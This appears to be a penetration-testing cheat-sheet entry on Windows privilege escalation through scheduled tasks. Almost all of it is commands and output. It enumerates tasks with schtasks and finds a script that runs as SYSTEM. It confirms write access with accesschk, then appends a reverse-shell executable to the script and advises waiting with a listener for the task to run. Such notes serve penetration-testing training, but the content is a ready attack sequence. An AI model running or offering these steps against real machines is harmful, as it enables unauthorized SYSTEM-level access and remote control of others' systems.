# Scheduled Tasks

### Local Enumeration and Exploitation

```bash
# A way to enumate the scheduled task list
CMD> schtasks /query /fo LIST /v > log.txt
Kali> cat log.txt | grep "admin \|Task To Run"

CMD> type C:\DevTools\CleanUp.ps1
type C:\DevTools\CleanUp.ps1
# This script will clean up all your old dev logs every minute.
# To avoid permissions issues, run as SYSTEM (should probably fix this later)

Remove-Item C:\DevTools\*.log

CMD> accesschk.exe /accepteula -quvw <username> C:\DevTools\CleanUp.ps1 
# You have a write permission. 
RW C:\DevTools\CleanUp.ps1
        FILE_ADD_FILE
        FILE_ADD_SUBDIRECTORY
        FILE_APPEND_DATA
        FILE_EXECUTE
        FILE_LIST_DIRECTORY
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_TRAVERSE
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
        DELETE
        SYNCHRONIZE
        READ_CONTROL
        
CMD> echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1 

# Set up a listner and wait for a task to run or run if you have permission. 
# SCHTASKS.EXE /RUN /TN "task name"
# SCHTASKS.EXE /RUN /TN "\MyApps\Regedit" 

```

>

